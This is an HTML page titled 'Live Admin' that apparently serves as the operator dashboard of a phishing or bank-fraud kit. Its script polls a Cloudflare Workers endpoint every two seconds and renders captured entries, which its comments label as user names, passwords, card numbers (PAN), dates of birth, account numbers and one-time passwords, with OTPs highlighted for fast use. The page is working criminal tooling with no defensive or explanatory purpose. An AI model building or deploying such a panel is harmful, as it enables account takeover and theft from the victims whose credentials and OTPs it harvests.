<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Live Admin</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        
        /* White Background */
        body { background-color: #ffffff; color: #333; padding-bottom: 20px; }

        /* Header: Clean Blue/Grey */
        .header {
            background: #f8f9fa;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #eee;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .header h1 { font-size: 15px; color: #666; text-transform: uppercase; letter-spacing: 1px; }
        
        /* Count Badge */
        .v-badge {
            background: #000;
            color: #fff;
            padding: 2px 12px;
            border-radius: 15px;
            font-weight: 700;
            font-size: 16px;
        }

        .container { 
            padding: 10px; 
            display: flex; 
            flex-direction: column; 
            gap: 10px; 
        }

        /* Card Style */
        .data-row {
            background: #ffffff;
            padding: 15px;
            border-radius: 10px;
            border: 1px solid #f0f0f0;
            box-shadow: 0 2px 5px rgba(0,0,0,0.03);
            font-size: 17px;
            font-weight: 700;
            line-height: 1.6;
            white-space: pre-wrap;
            word-break: break-all;
        }

        /* --- COLOR CODING LOGIC --- */
        
        /* Green for User, Pass, Pan, Dob, Acc */
        .text-green { color: #28a745 !important; }
        
        /* Red for OTP */
        .text-red { color: #dc3545 !important; }

        .time-stamp {
            display: block;
            font-size: 10px;
            color: #ccc;
            margin-top: 8px;
            font-weight: 400;
        }
    </style>
</head>
<body>

    <div class="header">
        <h1>Live Feed</h1>
        <div class="v-badge" id="vCount">0</div>
    </div>

    <div class="container" id="logsDisplay">
        </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
        let lastHash = "";

        async function refresh() {
            try {
                const res = await fetch(workerURL);
                const data = await res.json();
                
                const display = document.getElementById('logsDisplay');
                const badge = document.getElementById('vCount');

                const currentHash = JSON.stringify(data);
                if (currentHash === lastHash) return;
                lastHash = currentHash;

                if (!data) return;
                badge.innerText = data.length;

                // Render logic
                display.innerHTML = data.map(log => {
                    if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) {
                        return ""; 
                    }

                    // Color selection based on content
                    let colorClass = "text-green"; // Default Green
                    if (log.detail.includes("Otp:-")) {
                        colorClass = "text-red"; // Red for OTP
                    }

                    return `
                        <div class="data-row ${colorClass}">
                            ${log.detail}
                            <span class="time-stamp">${log.time || ''}</span>
                        </div>
                    `;
                }).join('');

            } catch (e) { console.log("Syncing..."); }
        }

        // Auto update every 2 seconds
        setInterval(refresh, 2000);
        window.onload = refresh;
    </script>
</body>
</html>
